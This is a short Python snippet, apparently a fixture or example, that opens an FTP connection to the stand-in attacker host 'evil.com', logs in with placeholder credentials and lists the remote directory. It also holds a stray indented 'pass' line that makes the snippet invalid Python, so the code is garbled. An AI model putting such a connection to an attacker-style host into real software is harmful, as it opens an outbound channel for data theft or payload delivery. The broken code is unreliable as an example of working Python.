import ftplib
ftp = ftplib.FTP('evil.com')
    pass  # no-op
ftp.login('user','pass')
ftp.retrlines('LIST')